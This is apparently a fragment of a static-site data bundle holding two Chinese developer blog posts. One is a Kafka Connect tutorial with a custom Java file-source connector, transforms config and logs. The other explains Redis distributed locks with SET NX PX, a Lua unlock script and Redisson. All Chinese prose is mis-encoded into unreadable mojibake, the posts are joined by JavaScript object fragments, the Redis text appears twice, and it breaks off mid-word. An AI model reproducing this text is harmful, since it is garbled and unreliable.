å¯å¨\n\nå¯å¨ kafka å zookeeper\n\nbin/zookeeper-server-start.sh config/zookeeper.properties & bin/kafka-server-start.sh -daemon config/server.properties \n\n\n1\n\n\nå¯å¨ connect-standalone\n\nbin/connect-standalone.sh config/connect-standalone.properties \\\nconfig/connect-file-source.properties \\\nconfig/connect-file-sink.properties\n\n\n1\n2\n3\n\n\nå¨ kafka ç®å½ä¸è¾å¥æµè¯\n\necho \'hello\' >> ./test.txt\n\n\n1\n\n\næ¥çå¤åºä¸ä¸æä»¶ test.sink.txt\n\n[root@localhost kafka_2.13-2.7.0]# ls\nbin  config  libs  license  logs  notice  site-docs  test.sink.txt  test.txt\n\n\n1\n2\n\n\n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\n\n\n1\n2\n\n\n> å¨ spring boot é¡¹ç®çå¬ connect-test ä¸æ ·å¯ä»¥æ¶å°æ¶æ¯ï¼å¦ä¸\n> connect-test {"schema":{"type":"string","optional":false},"payload":"hello"}\n> è¿éçæ¶æ¯å®éä¸é½æ¯ json æ ¼å¼çå¯¹è±¡ï¼è¿å°±æ¯ä¸é¢ key value.converter.schemas.enable=true çç¼æ\n\n# æ¹ååéåçæ¶æ¯\n\nä¸é¢çä¾å­åªæ¶å etl ä¸­ç e å l ï¼å³æ°æ®æ½åï¼ extract ï¼ä¸å è½½ ï¼load ï¼ãä½ä¸º etl æ¡æ¶ï¼ kafka connect ä¹æ¯æç¸å½ç¨åº¦çæ°æ®è½¬æ¢æä½ ä¸é¢æ¼ç¤ºå¨å°æä»¶æ°æ®å¯¼åºå°ç® æ æä»¶ä¹åä¸ºæ¯æ¡æ¶æ¯å¢å ä¸ä¸ª ip å­æ®µ å¦æè¦æå¥åéæå­æ®µï¼æä»¬å¿é¡»ä¿®æ¹ source connector çéç½®æä»¶ï¼å¢å ä»¥ä¸è¿äºè¡ï¼\n\ntransforms=wrapmap,inserthost\ntransforms.wrapmap.type=org.apache.kafka.connect.transforms.hoistfield$value\ntransforms.wrapmap.field=line\ntransforms.inserthost.type=org.apache.kafka.connect.transforms.insertfield$value\ntransforms.inserthost.static.field=ip\ntransforms.inserthost.static.value=com.connector.machinel \n\n\n1\n2\n3\n4\n5\n6\n\n\næµè¯å¦ä¸\n\n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\n[root@localhost kafka_2.13-2.7.0]# echo \'add ip test\' >> test.txt \n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\nstruct{line=add ip test,ip=com.connector.machinel}\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¾ç¶ï¼æ°å¢çæ°æ®è¢«å°è£æä¸ä¸ªç»æä½ ï¼struct ï¼ï¼å¹¶å¢å äº ip å­æ®µãè¿å°±æ¯ä¸é¢ wrapmapï¼inserthost çä½ç¨ã kafka connect è¿æä¾äºå¶ä»çè½¬æ¢æä½ï¼å®æ´ç¨æ³åè§ https://kafka.apache.org/documentation/#connect_transforms\n\n\n# èªå®ä¹ connector\n\n<dependency>\n    <groupid>org.apache.kafka</groupid>\n    <artifactid>connect-api</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\npackage com.example.demo.source;\n\nimport com.example.demo.task.filestreamsourcetask;\nimport org.apache.kafka.common.config.configdef;\nimport org.apache.kafka.connect.connector.task;\nimport org.apache.kafka.connect.source.sourceconnector;\n\nimport java.util.arraylist;\nimport java.util.hashmap;\nimport java.util.list;\nimport java.util.map;\n\n/**\n * @author big uncle\n * @date 2021/2/26 13:44\n * @module\n **/\npublic class filestreamsourceconnector extends sourceconnector {\n\n    private string filename;\n    private string topic;\n\n    /**\n     *è¿äºé½æ¯éç½®æä»¶éé¢ç key\n    **/\n    public static final string file_config = "file";\n    public static final string topic_config = "topic";\n\n    @override\n    public void start(map<string, string> map) {\n        filename = map.get(file_config);\n        topic = map.get(topic_config);\n        system.out.println("filestreamsourceconnector.startï¼"+map.tostring());\n    }\n\n    @override\n    public class<? extends task> taskclass() {\n        return filestreamsourcetask.class;\n    }\n\n    @override\n    public list<map<string, string>> taskconfigs(int i) {\n        arraylist<map<string, string>> configs =new arraylist<>();\n        //æ·»å ä¸ä¸ªè¾å¥æµ\n        map<string, string> config = new hashmap<>() ;\n        if(filename != null){\n            config.put(file_config, filename);\n        }\n        config.put(topic_config, topic);\n        configs.add(config);\n        system.out.println("filestreamsourceconnector.taskconfigsï¼"+config.tostring());\n        return configs;\n    }\n\n    @override\n    public void stop() {\n        // å¨è¯¥æ¹æ³ä¸­å³é­ connector ç¨å°çå¤é¨èµæº\n    }\n\n    @override\n    public configdef config() {\n        system.out.println("filestreamsourceconnector.configï¼");\n        return new configdef();\n    }\n\n    @override\n    public string version() {\n        return null;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\npackage com.example.demo.task;\n\nimport com.example.demo.source.filestreamsourceconnector;\nimport lombok.sneakythrows;\nimport org.apache.kafka.connect.data.schema;\nimport org.apache.kafka.connect.source.sourcerecord;\nimport org.apache.kafka.connect.source.sourcetask;\n\nimport java.io.*;\nimport java.util.arraylist;\nimport java.util.collections;\nimport java.util.list;\nimport java.util.map;\n\n/**\n * @author big uncle\n * @date 2021/2/26 13:56\n * @module\n **/\npublic class filestreamsourcetask extends sourcetask {\n\n    string filename;\n    fileinputstream stream;\n    string topic;\n    bufferedreader reader;\n\n    @override\n    public string version() {\n        return null;\n    }\n\n    @sneakythrows\n    @override\n    public void start(map<string, string> map) {\n        filename = map.get(filestreamsourceconnector.file_config);\n        stream = new fileinputstream(filename) ;\n        topic= map.get(filestreamsourceconnector.topic_config);\n        reader = new bufferedreader(new inputstreamreader(stream));\n        system.out.println("filestreamsourcetask.start");\n    }\n\n    /**\n     * pollæ¯ä¸ä¸ªçº¿ç¨ï¼ä¼ä¸ç´æ§è¡ç\n     * @author big uncle\n     * @date 2021/2/26 17:54\n    **/\n    @override\n    public list<sourcerecord> poll() throws interruptedexception {\n        try{\n            arraylist<sourcerecord> records= new arraylist<>();\n            string str = "";\n            while ((str = reader.readline()) != null && records.isempty()) {\n                // sourcepartitionè¡¨ç¤ºè®°å½æ¥èªçåä¸ªè¾å¥sourcepartitionï¼ä¾å¦ï¼æä»¶åï¼è¡¨åæä¸»é¢ååºï¼\n                map<string, object> sourcepartition = collections.singletonmap("filename", filename);\n                // sourceoffsetè¡¨ç¤ºè¯¥sourcepartitionä¸­çä½ç½®ï¼å¯ç¨äºæ¢å¤æ°æ®ä½¿ç¨ã\n                map<string, object> sourceoffset = collections.singletonmap("position", 1);\n                // åä¸ä¸ª sourcerecord å¯¹è±¡\n                sourcerecord sourcerecord = new sourcerecord(sourcepartition, sourceoffset,topic, schema.string_schema,str);\n                // æ·»å å° records\n                records.add(sourcerecord);\n                system.out.println("filestreamsourcetask.poll");\n            }\n            return records;\n        }catch(exception e){\n            e.printstacktrace();\n        }\n        return null;\n    }\n\n    @sneakythrows\n    @override\n    public void stop() {\n        if(stream != null) {\n            stream.close();\n        }\n        if(reader!=null) {\n            reader.close();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\n> æçæ¯ä¸ä¸ª maven é¡¹ç®ï¼æ´ä¸ªé¡¹ç®å°±ä»¥ä¸ä¸¤ä¸ªæä»¶ï¼ææ jar ä¹åï¼ä¸ä¼ å° /kafka/libs ç®å½ï¼ç¶åå¯ä»¥éæ°åä¸ä¸ªéç½®æä»¶ï¼ä¹å¯ä»¥ä½¿ç¨ connect-file-source.properties ç´æ¥ä¿®æ¹\n\nname=local-file-source\nconnector.class=com.example.demo.source.filestreamsourceconnector\ntasks.max=1\nfile=test.txt\ntopic=ct\n\n\n1\n2\n3\n4\n5\n\n\nå¯å¨æ¹å¼åä»¥ä¸ä¸æ ·\n\n--------------------------------------- å¯å¨æ¥å¿å¼å§ ------------------------------------------\n\n[2021-02-26 15:47:12,592] info rest resources initialized; server is started and ready to handle requests (org.apache.kafka.connect.runtime.rest.restserver:319)\n[2021-02-26 15:47:12,592] info kafka connect started (org.apache.kafka.connect.runtime.connect:57)\nfilestreamsourceconnector.configï¼\nfilestreamsourceconnector.configï¼\n\n\n1\n2\n3\n4\n\n\n[2021-02-26 15:47:12,685] info instantiated connector local-file-source with version null of type class com.example.demo.source.filestreamsourceconnector (org.apache.kafka.connect.runtime.worker:284)\n[2021-02-26 15:47:12,687] info finished creating connector local-file-source (org.apache.kafka.connect.runtime.worker:310)\nfilestreamsourceconnector.startï¼{connector.class=com.example.demo.source.filestreamsourceconnector, file=test.txt, tasks.max=1, name=local-file-source, topic=ct}\n\n\n1\n2\n3\n\n\n (org.apache.kafka.connect.runtime.connectorconfig$enrichedconnectorconfig:361)\nfilestreamsourceconnector.taskconfigsï¼{file=test.txt, topic=ct}\n[2021-02-26 15:47:12,705] info creating task local-file-source-0 (org.apache.kafka.connect.runtime.worker:509)\n\n\n1\n2\n3\n\n\nfilestreamsourcetask.start\n[2021-02-26 15:47:12,876] info workersourcetask{id=local-file-source-0} source task finished initialization and start (org.apache.kafka.connect.runtime.workersourcetask:233)\n[2021-02-26 15:47:12,877] info created connector local-file-source (org.apache.kafka.connect.cli.connectstandalone:112)\nfilestreamsourcetask.poll\n\n\n1\n2\n3\n4\n\n\n--------------------------------------- å¯å¨æ¥å¿ç»æ ------------------------------------------\n\n[root@localhost kafka_2.13-2.7.0]# echo \'dsdsa\' >> test.txt \n[root@localhost kafka_2.13-2.7.0]# echo \'dsdsa\' >> test.txt\n\n\n1\n2\n\n\n[2021-02-26 15:50:41,049] info workersourcetask{id=local-file-source-0} committing offsets (org.apache.kafka.connect.runtime.workersourcetask:478)\n[2021-02-26 15:50:41,050] info workersourcetask{id=local-file-source-0} flushing 0 outstanding messages for offset commit (org.apache.kafka.connect.runtime.workersourcetask:495)\n[2021-02-26 15:50:51,051] info workersourcetask{id=local-file-source-0} committing offsets (org.apache.kafka.connect.runtime.workersourcetask:478)\n[2021-02-26 15:50:51,052] info workersourcetask{id=local-file-source-0} flushing 0 outstanding messages for offset commit (org.apache.kafka.connect.runtime.workersourcetask:495)\nfilestreamsourcetask.poll\nfilestreamsourcetask.poll\n[2021-02-26 15:51:01,052] info workersourcetask{id=local-file-source-0} committing offsets (org.apache.kafka.connect.runtime.workersourcetask:478)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nspring boot æ¥æ¶å°æ¶æ¯\n\n@kafkalistener(id = "myid2", topics = "ct")\npublic void listen2(string in) {\n  system.out.println("connect-test"+in);\n}\n\n\n1\n2\n3\n4\n\n\nconnect-test{"schema":{"type":"string","optional":false},"payload":"hello"},{"schema":{"type":"string","optional":false},"payload":"hello"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"}\n\n\n1\n\n\n> æ¯æ¬¡éå¯é½ä¼æ¶è´¹ä¸æ¬¡ï¼éçé®é¢',charsets:{cjk:!0}},{title:"Redisåå¸å¼éä»ç»",frontmatter:{title:"Redisåå¸å¼éä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1602",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1602.Redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E4%BB%8B%E7%BB%8D.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1602.Redisåå¸å¼éä»ç».md",key:"v-dcb32594",path:"/redis/1602/",headers:[{level:2,title:"è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼",slug:"è¿ç§æ¹å¼æå å¤§è¦ç¹",normalizedTitle:"è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼",charIndex:382},{level:2,title:"é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èèredisçé¨ç½²é®é¢ï¼redisæ3ç§é¨ç½²æ¹å¼ï¼",slug:"é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤-è¿éè¦èèredisçé¨ç½²é®é¢-redisæ3ç§é¨ç½²æ¹å¼",normalizedTitle:"é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èè redis çé¨ç½²é®é¢ï¼redis æ 3 ç§é¨ç½²æ¹å¼ï¼",charIndex:655},{level:2,title:"å¦ä¸ç§æ¹å¼ï¼Redisson",slug:"å¦ä¸ç§æ¹å¼-redisson",normalizedTitle:"å¦ä¸ç§æ¹å¼ï¼redisson",charIndex:1304},{level:2,title:"å¯¹äºredisçåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼",slug:"å¯¹äºredisçåå¸å¼éèè¨-å®æä»¥ä¸ç¼ºç¹",normalizedTitle:"å¯¹äº redis çåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼",charIndex:2618}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼ é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èèredisçé¨ç½²é®é¢ï¼redisæ3ç§é¨ç½²æ¹å¼ï¼ å¦ä¸ç§æ¹å¼ï¼Redisson å¯¹äºredisçåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼",content:'ä½¿ç¨ Redis ååå¸å¼éçæè·¯å¤§æ¦æ¯è¿æ ·çï¼å¨ redis ä¸­è®¾ç½®ä¸ä¸ªå¼è¡¨ç¤ºå äºéï¼ç¶åéæ¾éçæ¶åå°±æè¿ä¸ª key å é¤ã\nå·ä½ä»£ç å¦ä¸ï¼\n\n// è·åé\n// NXæ¯æå¦ækeyä¸å­å¨å°±æåï¼keyå­å¨è¿åfalseï¼PXå¯ä»¥æå®è¿ææ¶é´\nSET anyLock unique_value NX PX 30000\n\n\n// éæ¾éï¼éè¿æ§è¡ä¸æ®µluaèæ¬\n// éæ¾éæ¶åå°ä¸¤æ¡æä»¤ï¼è¿ä¸¤æ¡æä»¤ä¸æ¯åå­æ§ç\n// éè¦ç¨å°redisçluaèæ¬æ¯æç¹æ§ï¼redisæ§è¡luaèæ¬æ¯åå­æ§ç\nif redis.call("get",KEYS[1]) == ARGV[1] then\nreturn redis.call("del",KEYS[1])\nelse\nreturn 0\nend\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼\n\n * ä¸å®è¦ç¨ SET key value NX PX milliseconds å½ä»¤\n   å¦æä¸ç¨ï¼åè®¾ç½®äºå¼ï¼åè®¾ç½®è¿ææ¶é´ï¼è¿ä¸ªä¸æ¯åå­æ§æä½ï¼æå¯è½å¨è®¾ç½®è¿ææ¶é´ä¹åå®æºï¼ä¼é ææ­»é (key æ°¸ä¹å­å¨)\n\n * value è¦å·æå¯ä¸æ§\n   è¿ä¸ªæ¯ä¸ºäºå¨è§£éçæ¶åï¼éè¦éªè¯ value æ¯åå éçä¸è´æå é¤ keyã\n   è¿æ¯é¿åäºä¸ç§æåµï¼åè®¾ A è·åäºéï¼è¿ææ¶é´ 30sï¼æ­¤æ¶ 35s ä¹åï¼éå·²ç»èªå¨éæ¾äºï¼A å»éæ¾éï¼ä½æ¯æ­¤æ¶å¯è½ B è·åäºéãA å®¢æ·ç«¯å°±ä¸è½å é¤ B çéäºã\n\n\n# é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èè redis çé¨ç½²é®é¢ï¼redis æ 3 ç§é¨ç½²æ¹å¼ï¼\n\n * åæºæ¨¡å¼\n * master-slave + sentinel éä¸¾æ¨¡å¼\n * redis cluster æ¨¡å¼\n\nä½¿ç¨ redis ååå¸å¼éçç¼ºç¹å¨äºï¼å¦æéç¨åæºé¨ç½²æ¨¡å¼ï¼ä¼å­å¨åç¹é®é¢ï¼åªè¦ redis æéäºãå éå°±ä¸è¡äºã\n\néç¨ master-slave æ¨¡å¼ï¼å éçæ¶ååªå¯¹ä¸ä¸ªèç¹å éï¼å³ä¾¿éè¿ sentinel åäºé«å¯ç¨ï¼ä½æ¯å¦æ master èç¹æéäºï¼åçä¸»ä»åæ¢ï¼æ­¤æ¶å°±ä¼æå¯è½åºç°éä¸¢å¤±çé®é¢ã\n\nåºäºä»¥ä¸çèèï¼å¶å® redis çä½èä¹èèå°è¿ä¸ªé®é¢ï¼ä»æåºäºä¸ä¸ª RedLock çç®æ³ï¼è¿ä¸ªç®æ³çææå¤§æ¦æ¯è¿æ ·çï¼\nåè®¾ redis çé¨ç½²æ¨¡å¼æ¯ redis clusterï¼æ»å±æ 5 ä¸ª master èç¹ï¼éè¿ä»¥ä¸æ­¥éª¤è·åä¸æéï¼\n\n * è·åå½åæ¶é´æ³ï¼åä½æ¯æ¯«ç§\n * è½®æµå°è¯å¨æ¯ä¸ª master èç¹ä¸åå»ºéï¼è¿ææ¶é´è®¾ç½®è¾ç­ï¼ä¸è¬å°±å åæ¯«ç§\n * å°è¯å¨å¤§å¤æ°èç¹ä¸å»ºç«ä¸ä¸ªéï¼æ¯å¦ 5 ä¸ªèç¹å°±è¦æ±æ¯ 3 ä¸ªèç¹ï¼n / 2 +1ï¼\n * å®¢æ·ç«¯è®¡ç®å»ºç«å¥½éçæ¶é´ï¼å¦æå»ºç«éçæ¶é´å°äºè¶æ¶æ¶é´ï¼å°±ç®å»ºç«æåäº\n * è¦æ¯éå»ºç«å¤±è´¥äºï¼é£ä¹å°±ä¾æ¬¡å é¤è¿ä¸ªé\n * åªè¦å«äººå»ºç«äºä¸æåå¸å¼éï¼ä½ å°±å¾ä¸æ­è½®è¯¢å»å°è¯è·åé\n\nä½æ¯è¿æ ·çè¿ç§ç®æ³è¿æ¯é¢å·äºè®®çï¼å¯è½è¿ä¼å­å¨ä¸å°çé®é¢ï¼æ æ³ä¿è¯å éçè¿ç¨ä¸å®æ­£ç¡®ã\n\n\n\n\n# å¦ä¸ç§æ¹å¼ï¼Redisson\n\næ­¤å¤ï¼å®ç° Redis çåå¸å¼éï¼é¤äºèªå·±åºäº redis client åç api æ¥å®ç°ä¹å¤ï¼è¿å¯ä»¥ä½¿ç¨å¼æºæ¡æ¶ï¼Redission\n\nRedisson æ¯ä¸ä¸ªä¼ä¸çº§çå¼æº Redis Clientï¼ä¹æä¾äºåå¸å¼éçæ¯æãæä¹éå¸¸æ¨èå¤§å®¶ä½¿ç¨ï¼ä¸ºä»ä¹å¢ï¼\n\nåæ³ä¸ä¸ä¸é¢è¯´çï¼å¦æèªå·±åä»£ç æ¥éè¿ redis è®¾ç½®ä¸ä¸ªå¼ï¼æ¯éè¿ä¸é¢è¿ä¸ªå½ä»¤è®¾ç½®çã\n\nSET anyLock unique_value NX PX 30000\n\n\n1\n\n\nè¿éè®¾ç½®çè¶æ¶æ¶é´æ¯ 30sï¼åå¦æè¶è¿ 30s é½è¿æ²¡æå®æä¸å¡é»è¾çæåµä¸ï¼key ä¼è¿æï¼å¶ä»çº¿ç¨æå¯è½ä¼è·åå°éã\n\nè¿æ ·ä¸æ¥çè¯ï¼ç¬¬ä¸ä¸ªçº¿ç¨è¿æ²¡æ§è¡å®ä¸å¡é»è¾ï¼ç¬¬äºä¸ªçº¿ç¨è¿æ¥äºä¹ä¼åºç°çº¿ç¨å®å¨é®é¢ãæä»¥æä»¬è¿éè¦é¢å¤çå»ç»´æ¤è¿ä¸ªè¿ææ¶é´ï¼å¤ªéº»ç¦äºï½\n\næä»¬æ¥çç redisson æ¯æä¹å®ç°çï¼åæåä¸ä¸ä½¿ç¨ redission çç½ï¼\n\nConfig config = new Config();\nconfig.useClusterServers()\n.addNodeAddress("redis://192.168.31.101:7001")\n.addNodeAddress("redis://192.168.31.101:7002")\n.addNodeAddress("redis://192.168.31.101:7003")\n.addNodeAddress("redis://192.168.31.102:7001")\n.addNodeAddress("redis://192.168.31.102:7002")\n.addNodeAddress("redis://192.168.31.102:7003");\n\nRedissonClient redisson = Redisson.create(config);\n\n\nRLock lock = redisson.getLock("anyLock");\nlock.lock();\nlock.unlock();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå°±æ¯è¿ä¹ç®åï¼æä»¬åªéè¦éè¿å®ç api ä¸­ç lock å unlock å³å¯å®æåå¸å¼éï¼ä»å¸®æä»¬èèäºå¾å¤ç»èï¼\n\n * redisson æææä»¤é½éè¿ lua èæ¬æ§è¡ï¼redis æ¯æ lua èæ¬åå­æ§æ§è¡\n * redisson è®¾ç½®ä¸ä¸ª key çé»è®¤è¿ææ¶é´ä¸º 30s, å¦ææä¸ªå®¢æ·ç«¯ææä¸ä¸ªéè¶è¿äº 30s æä¹åï¼\n   redisson ä¸­æä¸ä¸ª watchdog çæ¦å¿µï¼ç¿»è¯è¿æ¥å°±æ¯çé¨çï¼å®ä¼å¨ä½ è·åéä¹åï¼æ¯é 10 ç§å¸®ä½ æ key çè¶æ¶æ¶é´è®¾ä¸º 30s\n   è¿æ ·çè¯ï¼å°±ç®ä¸ç´ææéä¹ä¸ä¼åºç° key è¿æäºï¼å¶ä»çº¿ç¨è·åå°éçé®é¢äºã\n * redisson ç âçé¨çâ é»è¾ä¿è¯äºæ²¡ææ­»éåçã\n   å¦ææºå¨å®æºäºï¼çé¨çä¹å°±æ²¡äºãæ­¤æ¶å°±ä¸ä¼å»¶é¿ key çè¿ææ¶é´ï¼å°äº 30s ä¹åå°±ä¼èªå¨è¿æäºï¼å¶ä»çº¿ç¨å¯ä»¥è·åå°é)\n\n\n# å¯¹äº redis çåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼\n\n * å®è·åéçæ¹å¼ç®åç²æ´ï¼è·åä¸å°éç´æ¥ä¸æ­å°è¯è·åéï¼æ¯è¾æ¶èæ§è½ã\n * å¦å¤æ¥è¯´çè¯ï¼redis çè®¾è®¡å®ä½å³å®äºå®çæ°æ®å¹¶ä¸æ¯å¼ºä¸è´æ§ç (redis ä¸ç´æ§é®é¢çè¿é)ï¼å¨æäºæç«¯æåµä¸ï¼å¯è½ä¼åºç°é®é¢ãéçæ¨¡åä¸å¤å¥å£®\n * å³ä¾¿ä½¿ç¨ redlock ç®æ³æ¥å®ç°ï¼å¨æäºå¤æåºæ¯ä¸ï¼ä¹æ æ³ä¿è¯å¶å®ç° 100% æ²¡æé®é¢ï¼å³äº redlock çè®¨è®ºå¯ä»¥ç How to do distributed locking\n * redis åå¸å¼éï¼å¶å®éè¦èªå·±ä¸æ­å»å°è¯è·åéï¼æ¯è¾æ¶èæ§è½ã\n\nä½æ¯å¦ä¸æ¹é¢ä½¿ç¨ redis å®ç°åå¸å¼éå¨å¾å¤ä¼ä¸ä¸­éå¸¸å¸¸è§ï¼èä¸å¤§é¨åæåµä¸é½ä¸ä¼éå°æè°ç âæç«¯å¤æåºæ¯â\n\næä»¥ä½¿ç¨ redis ä½ä¸ºåå¸å¼éä¹ä¸å¤±ä¸ºä¸ç§å¥½çæ¹æ¡ï¼æéè¦çä¸ç¹æ¯ redis çæ§è½å¾é«ï¼å¯ä»¥æ¯æé«å¹¶åçè·åãéæ¾éæä½ã\n\nspring boot æ´å redisson çä¸¤ç§æ¹å¼ï¼\nèªå·±éç½®æ¹å¼ï¼https://www.cnblogs.com/yangzhilong/p/7605807.html\nspring boot starter æ¹å¼ï¼https://blog.csdn.net/a1058926697/article/details/116670391',normalizedContent:'ä½¿ç¨ redis ååå¸å¼éçæè·¯å¤§æ¦æ¯è¿æ ·çï¼å¨ redis ä¸­è®¾ç½®ä¸ä¸ªå¼è¡¨ç¤ºå äºéï¼ç¶åéæ¾éçæ¶åå°±æè¿ä¸ª key å é¤ã\nå·ä½ä»£ç å¦ä¸ï¼\n\n// è·åé\n// nxæ¯æå¦ækeyä¸å­å¨å°±æåï¼keyå­å¨è¿åfalseï¼pxå¯ä»¥æå®è¿ææ¶é´\nset anylock unique_value nx px 30000\n\n\n// éæ¾éï¼éè¿æ§è¡ä¸æ®µluaèæ¬\n// éæ¾éæ¶åå°ä¸¤æ¡æä»¤ï¼è¿ä¸¤æ¡æä»¤ä¸æ¯åå­æ§ç\n// éè¦ç¨å°redisçluaèæ¬æ¯æç¹æ§ï¼redisæ§è¡luaèæ¬æ¯åå­æ§ç\nif redis.call("get",keys[1]) == argv[1] then\nreturn redis.call("del",keys[1])\nelse\nreturn 0\nend\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼\n\n * ä¸å®è¦ç¨ set key value nx px milliseconds å½ä»¤\n   å¦æä¸ç¨ï¼åè®¾ç½®äºå¼ï¼åè®¾ç½®è¿ææ¶é´ï¼è¿ä¸ªä¸æ¯åå­æ§æä½ï¼æå¯è½å¨è®¾ç½®è¿ææ¶é´ä¹åå®æºï¼ä¼é ææ­»é (key æ°¸ä¹å­å¨)\n\n * value è¦å·æå¯ä¸æ§\n   è¿ä¸ªæ¯ä¸ºäºå¨è§£éçæ¶åï¼éè¦éªè¯ value æ¯åå éçä¸è´æå é¤ keyã\n   è¿æ¯é¿åäºä¸ç§æåµï¼åè®¾ a è·åäºéï¼è¿ææ¶é´ 30sï¼æ­¤æ¶ 35s ä¹åï¼éå·²ç»èªå¨éæ¾äºï¼a å»éæ¾éï¼ä½æ¯æ­¤æ¶å¯è½ b è·åäºéãa å®¢æ·ç«¯å°±ä¸è½å é¤ b çéäºã\n\n\n# é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èè redis çé¨ç½²é®é¢ï¼redis æ 3 ç§é¨ç½²æ¹å¼ï¼\n\n * åæºæ¨¡å¼\n * master-slave + sentinel éä¸¾æ¨¡å¼\n * redis cluster æ¨¡å¼\n\nä½¿ç¨ redis ååå¸å¼éçç¼ºç¹å¨äºï¼å¦æéç¨åæºé¨ç½²æ¨¡å¼ï¼ä¼å­å¨åç¹é®é¢ï¼åªè¦ redis æéäºãå éå°±ä¸è¡äºã\n\néç¨ master-slave æ¨¡å¼ï¼å éçæ¶ååªå¯¹ä¸ä¸ªèç¹å éï¼å³ä¾¿éè¿ sentinel åäºé«å¯ç¨ï¼ä½æ¯å¦æ master èç¹æéäºï¼åçä¸»ä»åæ¢ï¼æ­¤æ¶å°±ä¼æå¯è½åºç°éä¸¢å¤±çé®é¢ã\n\nåºäºä»¥ä¸çèèï¼å¶å® redis çä½èä¹èèå°è¿ä¸ªé®é¢ï¼ä»æåºäºä¸ä¸ª redlock çç®æ³ï¼è¿ä¸ªç®æ³çææå¤§æ¦æ¯è¿æ ·çï¼\nåè®¾ redis çé¨ç½²æ¨¡å¼æ¯ redis clusterï¼æ»å±æ 5 ä¸ª master èç¹ï¼éè¿ä»¥ä¸æ­¥éª¤è·åä¸æéï¼\n\n * è·åå½åæ¶é´æ³ï¼åä½æ¯æ¯«ç§\n * è½®æµå°è¯å¨æ¯ä¸ª master èç¹ä¸åå»ºéï¼è¿ææ¶é´è®¾ç½®è¾ç­ï¼ä¸è¬å°±å åæ¯«ç§\n * å°è¯å¨å¤§å¤æ°èç¹ä¸å»ºç«ä¸ä¸ªéï¼æ¯å¦ 5 ä¸ªèç¹å°±è¦æ±æ¯ 3 ä¸ªèç¹ï¼n / 2 +1ï¼\n * å®¢æ·ç«¯è®¡ç®å»ºç«å¥½éçæ¶é´ï¼å¦æå»ºç«éçæ¶é´å°äºè¶æ¶æ¶é´ï¼å°±ç®å»ºç«æåäº\n * è¦æ¯éå»ºç«å¤±è´¥äºï¼é£ä¹å°±ä¾æ¬¡å é¤è¿ä¸ªé\n * åªè¦å«äººå»ºç«äºä¸æåå¸å¼éï¼ä½ å°±å¾ä¸æ­è½®è¯¢å»å°è¯è·åé\n\nä½æ¯è¿æ ·çè¿ç§ç®æ³è¿æ¯é¢å·äºè®®çï¼å¯è½è¿ä¼å­å¨ä¸å°çé®é¢ï¼æ æ³ä¿è¯å éçè¿ç¨ä¸å®æ­£ç¡®ã\n\n\n\n\n# å¦ä¸ç§æ¹å¼ï¼redisson\n\næ­¤å¤ï¼å®ç° redis çåå¸å¼éï¼é¤äºèªå·±åºäº redis client åç api æ¥å®ç°ä¹å¤ï¼è¿å¯ä»¥ä½¿ç¨å¼æºæ¡æ¶ï¼redission\n\nredisson æ¯ä¸ä¸ªä¼ä¸çº§çå¼æº redis 